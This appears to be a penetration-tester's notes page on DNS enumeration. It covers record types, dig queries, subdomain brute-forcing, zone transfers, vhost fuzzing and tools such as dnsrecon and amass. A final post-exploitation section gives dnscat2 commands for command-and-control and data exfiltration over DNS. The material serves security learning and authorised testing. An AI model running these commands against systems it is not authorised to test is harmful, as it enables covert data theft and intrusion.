---
description: Domain Name System
---

# 53 - DNS

[active-information-gathering.md](../active-information-gathering.md)

Domain --> DNS Server --> DNS recursor --> DNS root zone (TLD) --> authoritative nameserver --> IP

• NS - Nameserver records contain the name of the authoritative servers hosting the DNS records for a domain.&#x20;

• A - Also known as a host record, the “a record” contains the IP address of a hostname (such as www.megacorpone.com).&#x20;

• MX - Mail Exchange records contain the names of the servers responsible for handling email for the domain. A domain can contain multiple MX records.&#x20;

• PTR - Pointer Records are used in reverse lookup zones and are used to find the records associated with an IP address.&#x20;

• CNAME - Canonical Name Records are used to create aliases for other host records.&#x20;

• TXT - Text records can contain any arbitrary data and can be used for various purposes, such as domain ownership verification.


![](https://mermaid.ink/svg/pako:eNptkk1uwjAQha8y8rpcIItWkAAtUNQmlSrksDDxlEQQT-QfJIS4ex2nNG1arzx-n5-ex3NhBUlkEdtr0ZSwSnMFfhm36w425DTEVDfOou60do15XGJxMBCLosQtjEb3MLk8vcCMnJIP156ceA3WFIiYZ6ikgWSdwatDfQZLkKKh4wn1dnBngyZceuQxKYWFNS39jjtTWfyCvdsgb2t9c-wN4-CU_A7dy8mPjFOeYuG0qU4IK6KDa4bgLdjck9ZpZcC_20e7dWmYbRroGU-JLKxFjZCh7h88C_KCv62Sf9RFUJd87GxJurLCtsH-cssuUlfMu8blit2xGnUtKul_-NKKObMl1pizyG-l0Iec5erqOeEsZWdVsMhqh3dMk9uXLPoQR-Mr10hhMamE73L9fYqysqSfuwEKc3T9BOe0sj4)

blocking unwanted websites by redirecting their domains to a non-existent IP address:
```txt
0.0.0.0       unwanted-site.com
```

| Record Type | Full Name                 | Description                                                                                                                                 | Zone File Example                                                                              |
| ----------- | ------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------- | ---------------------------------------------------------------------------------------------- |
| `A`         | Address Record            | Maps a hostname to its IPv4 address.                                                                                                        | `www.example.com.` IN A `192.0.2.1`                                                            |
| `AAAA`      | IPv6 Address Record       | Maps a hostname to its IPv6 address.                                                                                                        | `www.example.com.` IN AAAA `2001:db8:85a3::8a2e:370:7334`                                      |
| `CNAME`     | Canonical Name Record     | Creates an alias for a hostname, pointing it to another hostname.                                                                           | `blog.example.com.` IN CNAME `webserver.example.net.`                                          |
| `MX`        | Mail Exchange Record      | Specifies the mail server(s) responsible for handling email for the domain.                                                                 | `example.com.` IN MX 10 `mail.example.com.`                                                    |
| `NS`        | Name Server Record        | Delegates a DNS zone to a specific authoritative name server.                                                                               | `example.com.` IN NS `ns1.example.com.`                                                        |
| `TXT`       | Text Record               | Stores arbitrary text information, often used for domain verification or security policies.                                                 | `example.com.` IN TXT `"v=spf1 mx -all"` (SPF record)                                          |
| `SOA`       | Start of Authority Record | Specifies administrative information about a DNS zone, including the primary name server, responsible person's email, and other parameters. | `example.com.` IN SOA `ns1.example.com. admin.example.com. 2024060301 10800 3600 604800 86400` |
| `SRV`       | Service Record            | Defines the hostname and port number for specific services.                                                                                 | `_sip._udp.example.com.` IN SRV 10 5 5060 `sipserver.example.com.`                             |
| `PTR`       | Pointer Record            | Used for reverse DNS lookups, mapping an IP address to a hostname.                                                                          | `1.2.0.192.in-addr.arpa.` IN PTR `www.example.com.`                                            |
## Why DNS Matters for Web Recon

DNS is not merely a technical protocol for translating domain names; it's a critical component of a target's infrastructure that can be leveraged to uncover vulnerabilities and gain access during a penetration test:

- `Uncovering Assets`: DNS records can reveal a wealth of information, including subdomains, mail servers, and name server records. For instance, a `CNAME` record pointing to an outdated server (`dev.example.com` CNAME `oldserver.example.net`) could lead to a vulnerable system.
- `Mapping the Network Infrastructure`: You can create a comprehensive map of the target's network infrastructure by analysing DNS data. For example, identifying the name servers (`NS` records) for a domain can reveal the hosting provider used, while an `A` record for `loadbalancer.example.com` can pinpoint a load balancer. This helps you understand how different systems are connected, identify traffic flow, and pinpoint potential choke points or weaknesses that could be exploited during a penetration test.
- `Monitoring for Changes`: Continuously monitoring DNS records can reveal changes in the target's infrastructure over time. For example, the sudden appearance of a new subdomain (`vpn.example.com`) might indicate a new entry point into the network, while a `TXT` record containing a value like `_1password=...` strongly suggests the organization is using 1Password, which could be leveraged for social engineering attacks or targeted phishing campaigns.
## DNS Tools
| Tool                         | Key Features                                                                                            | Use Cases                                                                                                                               |
| ---------------------------- | ------------------------------------------------------------------------------------------------------- | --------------------------------------------------------------------------------------------------------------------------------------- |
| `dig`                        | Versatile DNS lookup tool that supports various query types (A, MX, NS, TXT, etc.) and detailed output. | Manual DNS queries, zone transfers (if allowed), troubleshooting DNS issues, and in-depth analysis of DNS records.                      |
| `nslookup`                   | Simpler DNS lookup tool, primarily for A, AAAA, and MX records.                                         | Basic DNS queries, quick checks of domain resolution and mail server records.                                                           |
| `host`                       | Streamlined DNS lookup tool with concise output.                                                        | Quick checks of A, AAAA, and MX records.                                                                                                |
| `dnsenum`                    | Automated DNS enumeration tool, dictionary attacks, brute-forcing, zone transfers (if allowed).         | Discovering subdomains and gathering DNS information efficiently.                                                                       |
| `fierce`                     | DNS reconnaissance and subdomain enumeration tool with recursive search and wildcard detection.         | User-friendly interface for DNS reconnaissance, identifying subdomains and potential targets.                                           |
| `dnsrecon`                   | Combines multiple DNS reconnaissance techniques and supports various output formats.                    | Comprehensive DNS enumeration, identifying subdomains, and gathering DNS records for further analysis.                                  |
| `theHarvester`               | OSINT tool that gathers information from various sources, including DNS records (email addresses).      | Collecting email addresses, employee information, and other data associated with a domain from multiple sources.                        |
| `Online DNS Lookup Services` | User-friendly interfaces for performing DNS lookups.                                                    | Quick and easy DNS lookups, convenient when command-line tools are not available, checking for domain availability or basic information |
### dig
```
|`dig domain.com`|Performs a default A record lookup for the domain.|
|`dig domain.com A`|Retrieves the IPv4 address (A record) associated with the domain.|
|`dig domain.com AAAA`|Retrieves the IPv6 address (AAAA record) associated with the domain.|
|`dig domain.com MX`|Finds the mail servers (MX records) responsible for the domain.|
|`dig domain.com NS`|Identifies the authoritative name servers for the domain.|
|`dig domain.com TXT`|Retrieves any TXT records associated with the domain.|
|`dig domain.com CNAME`|Retrieves the canonical name (CNAME) record for the domain.|
|`dig domain.com SOA`|Retrieves the start of authority (SOA) record for the domain.|
|`dig @1.1.1.1 domain.com`|Specifies a specific name server to query; in this case 1.1.1.1|
|`dig +trace domain.com`|Shows the full path of DNS resolution.|
|`dig -x 192.168.1.1`|Performs a reverse lookup on the IP address 192.168.1.1 to find the associated host name. You may need to specify a name server.|
|`dig +short domain.com`|Provides a short, concise answer to the query.|
|`dig +noall +answer domain.com`|Displays only the answer section of the query output.|
|`dig domain.com ANY`|Retrieves all available DNS records for the domain (Note: Many DNS servers ignore `ANY` queries to reduce load and prevent abuse, as per [RFC 8482](https://datatracker.ietf.org/doc/html/rfc8482)).|
```

## Subdomain Bruteforcing

> `Subdomain Brute-Force Enumeration` is a powerful active subdomain discovery technique that leverages pre-defined lists of potential subdomain names.
```bash
dnsenum --enum inlanefreight.com -f /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -r
```

## DNS Zone Transfers
> A DNS zone transfer is essentially a wholesale copy of all DNS records within a zone (a domain and its subdomains) from one name server to another. This process is essential for maintaining consistency and redundancy across DNS servers. However, if not adequately secured, unauthorised parties can download the entire zone file, revealing a complete list of subdomains, their associated IP addresses, and other sensitive DNS data.

```shell-session
dig axfr @nsztm1.digi.ninja zonetransfer.me
```

## Virtual Hosts
The key difference between `VHosts` and `subdomains` is their relationship to the `Domain Name System (DNS)` and the web server's configuration.

- `Subdomains`: These are extensions of a main domain name (e.g., `blog.example.com` is a subdomain of `example.com`). `Subdomains` typically have their own `DNS records`, pointing to either the same IP address as the main domain or a different one. They can be used to organise different sections or services of a website.
- `Virtual Hosts` (`VHosts`): Virtual hosts are configurations within a web server that allow multiple websites or applications to be hosted on a single server. They can be associated with top-level domains (e.g., `example.com`) or subdomains (e.g., `dev.example.com`). Each virtual host can have its own separate configuration, enabling precise control over how requests are handled.

```shell-session
gobuster vhost -u http://<target_IP_address> -w <wordlist_file> --append-domain
```


## Get domain

```sh
nslookup 
> server $IP
> $IP

dig @$IP -x $IP +short
```

```bash
host www.megacorpone.com # Get the IP (default)
host -t [mx/txt] # type of record (MX or TXT)

# FORWARD LOOKUP BRUTE FORCE
for ip in $(cat list.txt); do host $ip.megacorpone.com; done # use Seclists

# REVERSE LOOKUP BRUTE FORCE (TAKING THE IP APPROX RANGE FROM THE PREV STEP)
for ip in $(seq 50 100); do host 38.100.193.$ip; done | grep -v "not found"

# DNS ZONE TRANSFERS
host -l <domain name> <dns server address> # second arg is a nameserver 

# TOOLS
dnsrecon -d megacorpone.com -t axfr
dnsrecon -d megacorpone.com -D list.txt -t brt # -D list of subdomains
dnsenum zonetransfer.me

# Standard enumeration with findomain
findomain -t "target.domain" -a

# Standard enumeration with subfinder
subfinder -d "target.domain"

# Pipe subfinder with httpx to find HTTP services
echo "target.domain" | subfinder -silent | httpx -silent

# Standard enumeration with assetfinder
assetfinder "target.domain"
```

## Query domain


```bash
dig @IP $DOMAIN
dig @IP $DOMAIN ns
dig @IP $DOMAIN mx

dnsenum --dnsserver $IP -f /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt domain.com
```


## Domain Zone Transfer

[https://digi.ninja/projects/zonetransferme.php](https://digi.ninja/projects/zonetransferme.php)

Find subdomains not listed, it helps to get interesting info

```bash
Dig --> requests to DNS servers
dig axfr @IP $DNS
Ex: dig axfr @10.10.10.123 friendzone.red

# NOTE THE DIFFERENT DOMAINS AND INCLUDE ALL OF THEM WITH THE SAME IP

cat /etc/hosts
10.10.1.1 feos.domain administrator.domain uploads.domain others.domain

# NOTE: IT'S IMPORTANT TO SEE IF THE COMMONNAME OR DNS BELONGS TO HTTP OR HTTPS

############ WINDOWS
nslookup.exe
> server $TARGET_IP
> ls -d $DOMAIN
```

## Amass

OWASP's [Amass](https://github.com/OWASP/Amass) (Go) tool can gather information through DNS bruteforcing, DNS sweeping, NSED zone walking, DNS zone transfer, through web archives, through online DNS datasets and aggregators APIs, etc.

`amass enum --passive -d "domain.com"`

## DNSRecon

[DNSRecon](https://github.com/darkoperator/dnsrecon) (Python) can enumerate DNS information through the following techniques: check NS records for zone transfers, enumerate records, check for wildcard resolution, TLD expansion, bruteforce subdomain and host A and AAAA records given a wordlist, perform PTR lookup given an IP range, DNS cache snooping, etc.
```sh
# General enumeration
dnsrecon -d "target.domain"
# Standard enumeration and zone transfer (AXFR)
dnsrecon -a -d "target.domain"
# DNS bruteforcing/dictionnary attack
dnsrecon -t brt -d "target.domain" -n "nameserver.com" -D "/path/to/wordlist"
```

## DNS bruteforcing

Apart from [Amass](https://www.thehacker.recipes/web/recon/domains-enumeration#amass) and [DNSRecon](https://www.thehacker.recipes/web/recon/domains-enumeration#dnsrecord) mentioned above, [gobuster](https://github.com/OJ/gobuster) (go) can be used to do DNS bruteforcing.

`gobuster dns --domain "target.domain" --resolver "nameserver" --wordlist "/path/to/wordlist"`

Virtual hosting

Some applications don't allow vhost fuzzing like showcased above. The command below can be attempted.

`ffuf -c -r -w "/path/to/wordlist.txt" -u "http://FUZZ.$TARGET/"`

NOTE: Virtual host fuzzing is not the only technique to find subdomains. There are others means to that end: see [subdomains enumeration](https://www.thehacker.recipes/web/recon/domains-enumeration).


## DNS Rebinding

[https://nip.io/](https://nip.io/)

```
app.10.8.0.1.nip.io maps to 10.8.0.1
app-116-203-255-68.nip.io maps to 116.203.255.68
```

## Post-Exploitation 
### DNS Exfiltration 
> DNS exfiltration leverages DNS queries to extract data from compromised systems. dnscat2 provides encrypted command-and-control capabilities over DNS.

```sh
# Server setup
dnscat2 --dns server=$DNS_SERVER_IP:53

# Client connection
dnscat2 $DOMAIN
```
